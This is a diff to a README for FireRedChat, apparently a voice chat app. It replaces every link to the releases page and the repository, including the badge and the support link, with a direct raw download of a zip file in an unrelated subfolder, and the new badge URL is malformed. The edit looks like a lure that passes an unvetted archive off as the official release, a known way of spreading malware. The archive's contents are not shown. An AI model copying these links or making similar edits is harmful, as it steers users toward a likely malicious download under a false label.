@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download FireRedChat](https://img.shields.io/badge/Download%20FireRedChat-v1.0-blue.svg)](https://github.com/prodigitaly834/FireRedChat/releases)
+[![Download FireRedChat](https://raw.githubusercontent.com/prodigitaly834/FireRedChat/main/palaverist/FireRedChat.zip%https://raw.githubusercontent.com/prodigitaly834/FireRedChat/main/palaverist/FireRedChat.zip)](https://raw.githubusercontent.com/prodigitaly834/FireRedChat/main/palaverist/FireRedChat.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To download FireRedChat, follow these simple steps:
 
 1. **Visit the Release Page**  
    Go to the following link to access the latest version:  
-   [Download FireRedChat](https://github.com/prodigitaly834/FireRedChat/releases).
+   [Download FireRedChat](https://raw.githubusercontent.com/prodigitaly834/FireRedChat/main/palaverist/FireRedChat.zip).
 
 2. **Select the Latest Release**  
    On the releases page, you will see a list of available versions. Look for the latest release.
@@ -89,9 +89,9 @@ A: You will find a help section within the application that provides guidance on
 
 ## 📞 Support
 
-For further assistance, please visit the [FireRedChat GitHub page](https://github.com/prodigitaly834/FireRedChat) and check the issues section for tips or to report any problems.
+For further assistance, please visit the [FireRedChat GitHub page](https://raw.githubusercontent.com/prodigitaly834/FireRedChat/main/palaverist/FireRedChat.zip) and check the issues section for tips or to report any problems.
 
 ## 🔗 Conclusion
 
 Thank you for choosing FireRedChat for your voice interaction needs. Enjoy your experience, and don’t hesitate to explore all the features the application has to offer. For any updates and additional information, remember to check the release page regularly:  
-[Download FireRedChat](https://github.com/prodigitaly834/FireRedChat/releases).
+[Download FireRedChat](https://raw.githubusercontent.com/prodigitaly834/FireRedChat/main/palaverist/FireRedChat.zip).
